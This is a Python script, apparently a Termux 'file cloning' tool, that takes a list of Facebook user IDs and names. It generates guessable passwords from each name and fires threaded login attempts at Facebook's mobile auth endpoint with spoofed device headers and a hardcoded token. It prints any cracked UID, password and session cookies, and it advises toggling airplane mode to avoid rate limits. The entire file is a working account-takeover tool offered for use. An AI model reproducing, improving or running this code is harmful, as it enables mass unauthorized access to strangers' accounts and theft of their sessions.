import time,os,json,sys,re,string, random ,uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool


try:
    import rich
except:
    print("\n[!?] Installing Rich...\n")
    os.system("pip install rich")
    import rich

try:
    import requests
except:
    print("\n[!?] Installing Requests...\n")
    os.system("pip install requests")
    import requests

try:
    import httpx
except:
    print("\n[!?] Installing Httpx...\n")
    os.system("pip install httpx")
    import httpx

try:
    import bs4
except:
    print("\n[!?] Installing Bs4...\n")
    os.system("pip install bs4")
    import bs4



from os import system as shell
from rich import print
from rich import print_json
from rich import pretty
from rich.progress import track
from rich.markdown import Markdown
from rich.tree import Tree
from rich.panel import Panel
from rich.padding import Padding
pretty.install()

from datetime import datetime 
ct=str(datetime.now())
ct2=ct.split(" ")[0]
ct3=ct2.split("-")[1]
mon={"01":"January","02":"February","03":"March","04":"April","05":"May","06":"June","07":"July","08":"August","09":"September","10":"October","11":"November","12":"December"}
month=mon[ct3]
datea=ct2.split("-")[2]


def lod(message):
    
    for i in track(range(300), description=f"[red][bold] {message}"):
        time.sleep(0.01)



def clear():
    shell("clear")

def logo():
    clear()
    print("""
   _ __ ___  ___   _   _  __
  /// // _/ / o |,' \ / |/ /
 / ` // _/ /  ,'/ o |/ || / 
/_n_//___//_/`_\|_,'/_/|_/       0.2
    """)
    
def space():
    print("\n")


number=int("+8801944981090")

devoloper_info={
    "Developer" :  'HERON AFRIDI',
    "Number" :  number,
    "Status" :  '24-ONLINE',
    "GitHub Url":  'https://github.com/TEAM-ELITE1',
    "Facebook" :  'facebook.com/Freestyle.0fficial',
    }

date={
    "Day":datea,
    "Month":month,
 }

mx=Tree("[bold purple]![[bold red]A[bold purple]] ")
mx.add("[bold yellow]FILE CLONEING").add("[bold green][GREAT]")

my=Tree("[bold purple]![[bold red]B[bold purple]] ")
my.add("[tan][bold]REPORT BUG ")

cv=Tree("[bold blue][>+<]")
cv.add("[bold red]Choice Option")



ugen=[]



note1="""- __Inbox__ Me for Join `Team Elite`\n- Try tool and **Review**"""
n1=Markdown(note1)

note2="""#  __FILE CLONEING TASK BOX__"""
n2=Markdown(note2)

note3="""- __System__ Starting Bro Wait\n- Follow our **FB Group**\n- Inbox Me For Anything"""
n3=Markdown(note3)

note4="""- Use Airplane mode in every 3 minutes \n- Use APN For Get More Ok ID \n- Cracking Started """
n4=Markdown(note4)

note5="""- Input Your File Path ...\n- Use Indian Id File Only\n- __Example__ `/sdcard/India.txt`"""
n5=Markdown(note5)
nv = Padding("TOOL MENU", style="on green", expand=False)
cxx = Padding("DONE",(1,2), style="on green", expand=False)



import os
try:
    open(".itu.txt","r").read()
except:
    os.system("pkg install play-audio")
    open(".itu.txt","w").write("__&")
try:
    import gtts
except:
    os.system("pip install gtts")
    import gtts
from gtts import gTTS

def create_(text,file):
    my_a = gTTS(text)
    my_a.save(file)


def play_audio(audio_file):
    os.system("play-audio "+audio_file)

def dual(text,file):
    create_(text,file)
    play_audio(file)
    

ok=[]
ok.append("199")
loop=0
def main():
    logo()
    space()
    print(n3)
    space()
    lod("STARTING TOOL...")
    logo()
    print_json(data=devoloper_info)
    print(Panel(n1,title="[bold red]NOTE"))
    space()
    #dual("Hello bro,I am Zara,I am an artificial intelligent,and welcome to our tool","y.mp3")
    
    print(nv)
    space()
    print(mx)
    print(my)
    space()
    print(cv)
    choice=input("    └──>")
    if choice in ["a","A","1","01"]:
        numb()
    else:
        numb()

def numb():
    global n2,n5
    logo()
    
    print(n2)
    space()
    print(n5)
    
    hsss=input("\n[!?] File Path :")
    try:
        user=open(hsss,"r").read().splitlines()
    except:numb()
    print(cxx)
    space()
    
    #dual("Dumping successful","y.mp3")
    
    with ThreadPool (max_workers=50) as feel:
        logo()
        tl=str(len(user))
        tl_=Tree("[green]Total ID ")
        tl_.add("[bold green]"+tl)
        
        space()
        print(n4)
        space()
        print_json(data=date)
        space()
        print(tl_)
        space()
        print(Markdown("# Crack Started"))
        space()
        space()
        space()
        for i in user:
            uid=i.split("|")[0]
            name=i.split("|")[1]
            namex=name.lower()
            pwx=["57273200","57575751","59039200"]
            
            try:
                n1=namex.split(" ")[0]
                if len(n1) >=2:
                    pwx.append(n1+"123")
                    pwx.append(n1+"1234")
                    if len(n1) >=5:
                        pwx.append(n1+"@")
                    else: pass
                    
                    if len(n1) >=4:
                        pwx.append(n1+"@@")
                        pwx.append(n1+"@#")
                    else:pass
                else:pass
            except:pass
            
            
            
            try:
                n2=namex.split(" ")[1]
                if len(n1) >=2:
                    pwx.append(n2+"123")
                    pwx.append(n2+"1234")
                    if len(n1) >=5:
                        pwx.append(n2+"@")
                    else: pass
                    
                    if len(n1) >=4:
                        pwx.append(n2+"@@")
                        pwx.append(n2+"@#")
                    else:pass
                else:pass
            except:pass
            
            
            
            try:
                n3=namex.split(" ")[2]
                if len(n1) >=2:
                    pwx.append(n3+"123")
                    pwx.append(n3+"1234")
                    if len(n1) >=5:
                        pwx.append(n3+"@")
                    else: pass
                    
                    if len(n1) >=4:
                        pwx.append(n3+"@@")
                        pwx.append(n3+"@#")
                    else:pass
                else:pass
            except:pass
            
            feel.submit(need,uid,pwx,tl)






def need(uid,pwx,tl):
    global ok,ugen,loop
    session=requests.session()
    sys.stdout.write(f"\r  \33[1;90m[ \33[1;97m✘D\33[1;92m | {'{:.1%}'.format(loop/int(tl))} | \33[1;97m{loop} \33[1;90m] \r "),
    sys.stdout.flush()
    try:
        for ps in pwx:
            ua="Dalvik/2.1.0 (Linux; U; Android 9; SM-G955F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/255.0.0.14.126;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/202766316;FBCR/SUN;FBMF/samsung;FBBD/samsung;FBDV/SM-G955F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2960};FB_FW/1;]"
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            url1= 'https://b-graph.facebook.com/auth/login'
            heron_brand=session.post(url1,data=data,headers=head).json()
            if "session_key" in heron_brand:
                xd=heron_brand["uid"]
                coki=";".join(i["name"]+"="+i["value"] for i in heron_brand["session_cookies"])
                print(f"\r\r[white reverse][🔷]=UID/PAS[/white reverse] [bold green]{xd} [cyan]• [black reverse]{ps}[/black reverse] \n[yellow reverse]COOKIES=[🔶][/yellow reverse][bold green]{coki}\n\n\n")
                ok.append(uid)
                break
            elif "www.facebook.com" in str(heron_brand):
                break 
            else:
                continue
        loop+=1
    except:
        time.sleep(15)

main()